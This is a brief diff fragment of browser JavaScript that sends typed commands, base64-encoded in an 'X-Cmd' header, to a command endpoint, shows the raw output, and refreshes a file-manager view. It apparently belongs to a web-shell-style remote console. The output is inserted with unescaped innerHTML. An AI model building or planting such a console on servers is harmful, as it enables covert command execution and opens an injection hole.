+            api('cmd', currentPath, 'GET', { 'X-Cmd': btoa(cmd) }).then(r => r.text()).then(res => { 
+                outDiv.innerHTML += `<div style="color:#9cdcfe; margin-bottom:10px;">${res}</div>`; 
+                outDiv.scrollTop = outDiv.scrollHeight; 
+                
+                // FITUR BARU: Auto Refresh File Manager setelah command selesai
+                loadDir(''); 
+            });
         }
     });
 
